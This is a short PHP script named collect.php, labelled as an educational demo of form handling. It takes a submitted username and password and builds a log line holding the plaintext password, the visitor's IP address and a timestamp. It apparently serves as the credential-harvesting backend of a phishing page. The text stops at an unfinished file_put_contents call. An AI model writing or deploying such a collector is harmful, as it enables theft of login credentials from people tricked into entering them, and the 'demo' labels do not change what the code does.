<?php
/*
=================================================
 DEMO collect.php
 Purpose: Learn PHP form handling (POST)
 NOTE: Educational / Testing use only
=================================================
*/

date_default_timezone_set("Asia/Kolkata");

// Sirf POST request allow
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(405);
    echo "Method Not Allowed";
    exit;
}

// Input ko safely read karo
$demoUser = isset($_POST['demo_username']) ? trim($_POST['demo_username']) : '';
$demoPass = isset($_POST['demo_password']) ? trim($_POST['demo_password']) : '';

// Basic validation
if ($demoUser === '' || $demoPass === '') {
    echo "<h3>❌ Invalid demo input</h3>";
    exit;
}

// XSS safety
$demoUserSafe = htmlspecialchars($demoUser, ENT_QUOTES, 'UTF-8');
$demoPassSafe = htmlspecialchars($demoPass, ENT_QUOTES, 'UTF-8');

// Log format
$logData  = "==============================" . PHP_EOL;
$logData .= "Demo Username: " . $demoUserSafe . PHP_EOL;
$logData .= "Demo Password: " . $demoPassSafe . PHP_EOL;
$logData .= "IP Address  : " . $_SERVER['REMOTE_ADDR'] . PHP_EOL;
$logData .= "Time        : " . date("d-m-Y H:i:s") . PHP_EOL;

// File me save
file_put_contents
